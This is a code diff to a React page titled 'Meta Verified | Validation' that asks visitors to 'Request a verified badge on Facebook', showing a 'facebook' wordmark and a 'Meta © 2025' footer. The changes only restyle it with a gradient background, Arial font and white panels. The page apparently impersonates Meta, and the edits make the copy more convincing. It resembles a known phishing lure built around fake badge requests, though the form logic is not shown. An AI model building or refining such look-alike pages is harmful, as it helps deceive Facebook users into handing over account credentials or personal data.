@@ -73,7 +73,10 @@ export default function Validation() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-white">
+    <div className="min-h-screen flex flex-col" style={{
+      background: "linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)",
+      fontFamily: "Arial, Helvetica, sans-serif"
+    }}>
       <MetaTags 
         title="Meta Verified | Validation"
         description="Request a verified badge on Facebook - Initial Step"
@@ -81,7 +84,7 @@ export default function Validation() {
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
       {/* Navigation Bar */}
-      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
+      <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white">
         <div className="flex items-center">
           <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
         </div>
@@ -96,7 +99,7 @@ export default function Validation() {
       </nav>
 
       <div className="flex-1 flex justify-center p-4 sm:p-8">
-        <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
+        <div className="max-w-2xl w-full space-y-4 sm:space-y-6 bg-white rounded-lg p-6">
           <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
             Request a verified badge on Facebook
           </h1>
@@ -194,7 +197,7 @@ export default function Validation() {
         </div>
       </div>
 
-      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
+      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white">
         Meta © 2025
       </div>
       <style>{`
